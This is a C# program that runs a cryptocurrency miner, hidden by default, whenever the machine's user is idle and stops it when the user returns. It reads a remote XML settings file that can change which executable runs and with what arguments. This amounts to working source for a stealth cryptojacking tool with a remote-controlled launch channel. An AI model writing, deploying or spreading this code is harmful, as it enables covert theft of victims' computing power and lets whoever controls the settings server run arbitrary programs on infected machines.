using System;
using System.Threading;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Xml;

namespace IdleMine
{
    [StructLayout(LayoutKind.Sequential)]
    struct LASTINPUTINFO
    {
        public static readonly int SizeOf = Marshal.SizeOf(typeof(LASTINPUTINFO));

        [MarshalAs(UnmanagedType.U4)]
        public UInt32 cbSize;
        [MarshalAs(UnmanagedType.U4)]
        public UInt32 dwTime;
    }

    class Program
    {
        [DllImport("user32.dll")]
        static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);

        // defaults
        string settings_url = "http://somewebserver.here/settings.xml";
        string exe = "yam.exe";
        string exeargs = "-c x -M stratum+tcp://[YOUR-WALLET-ADDRESS-HERE]:x@monerohash.com:3333/xmr";
        int windowmode = 1; // 1 == hidden, 0 == normal 
        int idle_seconds = 300;

        static void Main(string[] args)
        {
            new Program(args);
        }

        public Program(string[] args)
        {
            try
            {
                settings_url = (args[0] != null) ? args[0] : settings_url;
                
            } catch (System.IndexOutOfRangeException e)
            {
            }

            loadingRemoteSettings();

            bool running = false;
            int interval_secs = 1;

            Process process = new Process();
            process.StartInfo.FileName = exe;
            process.StartInfo.Arguments = exeargs;
            process.StartInfo.WindowStyle = (ProcessWindowStyle)windowmode;

            while (true)
            {
                Thread.Sleep(interval_secs * 1000);
                uint idlesecs = GetLastInputTime();

                if (idlesecs > idle_seconds && !running)
                {
                    process.Start();
                    running = true;
                }
                else if (idlesecs < idle_seconds && running)
                {
                    process.Kill();
                    running = false;
                }
            }
        }

        /**
         * 
         */
        void loadingRemoteSettings()
        {
            XmlReader xmlReader = XmlReader.Create(settings_url);
            while (xmlReader.Read())
            {
                if ((xmlReader.NodeType == XmlNodeType.Element) && (xmlReader.Name == "program"))
                    exe = xmlReader.ReadElementContentAsString();

                if ((xmlReader.NodeType == XmlNodeType.Element) && (xmlReader.Name == "args"))
                    exeargs = xmlReader.ReadElementContentAsString();

                if ((xmlReader.NodeType == XmlNodeType.Element) && (xmlReader.Name == "window"))
                    windowmode = xmlReader.ReadElementContentAsInt();

                if ((xmlReader.NodeType == XmlNodeType.Element) && (xmlReader.Name == "idleseconds"))
                    idle_seconds = xmlReader.ReadElementContentAsInt();
            }
        }

        // Return the idle time in seconds
        uint GetLastInputTime()
        {
            uint idleTime = 0;
            LASTINPUTINFO lastInputInfo = new LASTINPUTINFO();
            lastInputInfo.cbSize = (uint)Marshal.SizeOf(lastInputInfo);
            lastInputInfo.dwTime = 0;

            uint envTicks = (uint)Environment.TickCount;

            if (GetLastInputInfo(ref lastInputInfo))
            {
                uint lastInputTick = lastInputInfo.dwTime;
                idleTime = envTicks - lastInputTick;
            }

            return ((idleTime > 0) ? (idleTime / 1000) : 0);
        }
    }
}
